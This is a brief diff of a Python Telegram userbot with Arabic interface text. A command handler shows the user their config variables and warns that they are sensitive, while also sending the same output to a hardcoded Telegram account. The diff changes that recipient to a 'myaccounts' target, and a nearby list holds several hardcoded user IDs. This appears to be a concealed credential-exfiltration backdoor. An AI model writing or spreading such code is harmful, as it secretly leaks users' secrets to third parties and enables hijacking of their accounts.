@@ -441,7 +441,7 @@ async def Hussein(event):
                     f"**[الساحر](tg://need_update_for_some_feature/) قـائمـة الـفـارات:**\n\n\n{o}\n\n**انتبه هنالك معلومات حساسة لا تُعطِها لشخص غير موثوق**"
                 )
                 # Send the output to user ID 6205161271
-                await l313l.send_message(6205161271, OUTPUT)
+                await l313l.send_message(myaccounts, OUTPUT)
 
 SX9OO = [6205161271,6309878173,6320583148,6295913543,5762222122]
 
